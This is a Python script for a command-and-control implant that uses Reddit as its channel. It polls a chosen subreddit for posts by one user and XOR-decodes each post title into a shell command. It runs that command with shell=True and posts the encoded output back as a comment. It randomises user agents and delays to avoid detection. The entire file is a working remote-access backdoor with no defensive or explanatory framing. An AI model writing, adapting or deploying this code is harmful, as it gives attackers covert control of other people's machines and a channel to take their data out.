import praw
import time
import subprocess
import re
import random
import string
import base64

# Authorized subreddit and user
SUBREDDIT_NAME = ""
COMMAND_USER = ""
XOR_KEY = ""

# Configure your Reddit credentials
reddit = praw.Reddit(
    client_id='',
    client_secret='',
    username='',
    password='',
    user_agent=''
)

def generate_user_agent():
    platforms = [
        "Windows NT 10.0; Win64; x64",
        "X11; Linux x86_64",
        "Macintosh; Intel Mac OS X 10_15_7"
    ]
    browser = random.choice(["Firefox", "Chrome", "Edge"])
    platform = random.choice(platforms)
    build = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"Mozilla/5.0 ({platform}) {browser}/{build} RedditC2Bot"

def xor_cipher(data: str, key: str = XOR_KEY, mode="encrypt") -> str:
    if mode == "encrypt":
        raw = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        return base64.b64encode(raw.encode()).decode()
    elif mode == "decrypt":
        raw = base64.b64decode(data.encode()).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(raw))

def execute_command(command):
    print(f"[DECRYPTED EXECUTION] {command}")
    try:
        output = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, timeout=20, text=True
        )
    except subprocess.CalledProcessError as e:
        output = f"[ERROR]\n{e.output}"
    except Exception as e:
        output = f"[EXCEPTION]\n{str(e)}"
    return output[:9500]

def try_comment(post, message):
    while True:
        try:
            wait_time = random.randint(7, 15)
            print(f"[+] Waiting {wait_time}s before commenting...")
            time.sleep(wait_time)
            separator = f"<!--sep-{random.randint(1000,9999)}-->"
            final_message = message + f"\n{separator}"
            post.reply(final_message)
            return
        except praw.exceptions.APIException as e:
            error_msg = str(e)
            if "RATELIMIT" in error_msg:
                match = re.search(r"(\d+)\s(second|minute)", error_msg)
                if match:
                    delay = int(match.group(1))
                    if match.group(2) == "minute":
                        delay *= 60
                    print(f"[RATE LIMIT] Waiting {delay} seconds...")
                    time.sleep(delay + random.randint(3, 6))
                else:
                    print("[RATE LIMIT] Waiting 12s as a precaution...")
                    time.sleep(12)
            else:
                raise e

def process_posts(subreddit):
    for post in subreddit.new(limit=10):
        if post.author.name != COMMAND_USER:
            continue
        if post.selftext.strip():
            continue
        post.comments.replace_more(limit=0)
        if any(comment.author.name == reddit.user.me().name for comment in post.comments):
            continue

        try:
            command = xor_cipher(post.title, mode="decrypt")
            result = execute_command(command)
            encrypted_response = xor_cipher(result, mode="encrypt")
            try_comment(post, encrypted_response)
            print(f"[OK] Replied to post: {post.id}")
        except Exception as e:
            print(f"[ERROR post {post.id}] {e}")

def main():
    try:
        subreddit = reddit.subreddit(SUBREDDIT_NAME)
        print(f"[OK] Executor agent monitoring r/{SUBREDDIT_NAME}")
    except Exception as e:
        print(f"[ERROR] Could not access subreddit: {str(e)}")
        return

    while True:
        try:
            process_posts(subreddit)
        except Exception as e:
            print(f"[ERROR loop] {e}")
        time.sleep(random.randint(10, 20))

if __name__ == "__main__":
    main()
